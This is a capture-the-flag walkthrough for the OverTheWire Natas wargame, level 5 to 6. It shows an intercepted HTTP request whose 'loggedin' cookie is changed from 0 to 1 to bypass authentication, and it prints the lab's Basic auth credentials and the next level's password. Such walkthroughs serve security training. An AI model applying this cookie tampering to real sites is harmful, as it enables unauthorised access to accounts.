# Level 5 to Level 6

Open the natas5 page, then open fidler and put it in breakpoint mode.
Refresh the page and go to fiddler and change the value in the cookie from 0 to 1

```
GET http://natas5.natas.labs.overthewire.org/ HTTP/1.1
Host: natas5.natas.labs.overthewire.org
Proxy-Connection: keep-alive
Cache-Control: max-age=0
Authorization: Basic bmF0YXM1OmlYNklPZm1wTjdBWU9RR1B3dG4zZlhwYmFKVkpjSGZx
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.88 Safari/537.36 Vivaldi/1.7.735.46
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
DNT: 1
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.8
Cookie: loggedin=1
```

Then the following message appears:

```
Access granted. The password for natas6 is aGoY4q2Dc6MgDq4oL4YtoKtyAg9PeHa1
```